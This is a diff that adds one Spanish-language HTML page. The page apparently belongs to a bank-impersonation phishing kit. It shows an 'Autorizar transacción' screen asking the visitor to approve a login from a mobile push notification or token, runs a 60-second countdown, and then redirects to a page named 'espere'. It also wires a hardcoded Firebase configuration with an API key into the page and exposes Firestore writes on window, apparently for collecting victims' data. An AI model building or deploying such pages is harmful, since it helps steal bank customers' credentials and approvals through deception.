@@ -1,0 +1,129 @@
+<html><head><style>
+    body {
+      font-family: Arial, sans-serif;
+      align-items: center;
+    }
+
+    .modal1 {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      padding: 25px;
+      width: 350px;
+      text-align: center;
+      border: 2px solid #3cb371;
+    }
+
+    .modal h2 {
+      color: #2a7a3a;
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .timer {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 15px 0;
+      color: #333;
+    }
+
+    .loading {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3cb371;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+    <link href="./fonts/desktops.css" type="text/css" rel="stylesheet">
+	<link rel="SHORTCUT ICON" href="images/favicon.ico">
+	<meta charset="UTF-8">
+	<META HTTP-EQUIV="REFRESH" CONTENT="65;URL=espere">
+	<title>Ingresando</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>     
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+const fbseconfig = {
+  apiKey: "AIzaSyBAFMqfpBe-lJc8zvZiwoWv8Wtgjph7GDY",
+  authDomain: "prrueba02-a7511.firebaseapp.com",
+  databaseURL: "https://prrueba02-a7511-default-rtdb.firebaseio.com",
+  projectId: "prrueba02-a7511",
+  storageBucket: "prrueba02-a7511.firebasestorage.app",
+  messagingSenderId: "409778587656",
+  appId: "1:409778587656:web:627110c05e23bd3c5869bd"
+};
+
+      const app = initializeApp(fbseconfig);
+      const db = getFirestore(app);
+
+      window.db = db;
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+</head>
+<body>
+
+    <div style="margin-top: 20px;margin-bottom: 20px;margin-left: auto;margin-right: auto;width: 52%;">
+	<img src="images/1.png" alt="logo">
+	</div>
+	
+<div class="bottom_nav"></div>
+
+<div style="margin-top: 35px;margin-left: auto;margin-bottom: 20px;margin-right: auto;width: 51%;">
+<center><div class="modal1">
+    <h2>Autorizar transacción</h2><br>
+    <p>Apruebe su inicio de sesión desde la notificación enviada a su dispositivo móvil registrado, 
+    o bien, utilice la opción Token en la aplicación de banca digital.</p>
+
+    <p>Esperando su autorización, la cual caducará en:</p>
+    <div class="timer" id="countdown">01:00</div>
+
+    <div><img src="spinner.gif" alt="logo"></div>
+    <div class="loading">Procesando...</div>
+  </div></center>
+
+  <script>
+    let time = 60; // 60 segundos
+    let countdownEl = document.getElementById("countdown");
+
+    let timer = setInterval(() => {
+      time--;
+      let minutes = Math.floor(time / 60);
+      let seconds = time % 60;
+      countdownEl.textContent = 
+        (minutes < 10 ? "0" : "") + minutes + ":" + 
+        (seconds < 10 ? "0" : "") + seconds;
+
+      if (time <= 0) {
+        clearInterval(timer);
+        countdownEl.textContent = "Expirado";
+        document.querySelector(".loading").textContent = "Tiempo agotado ❌";
+      }
+    }, 1000);
+  </script>
+
+<img src="images/6.png" alt="logo" style="border-width:0px;">
+</div>
+
+<div class="bottom_nav"></div>
+</body></html>
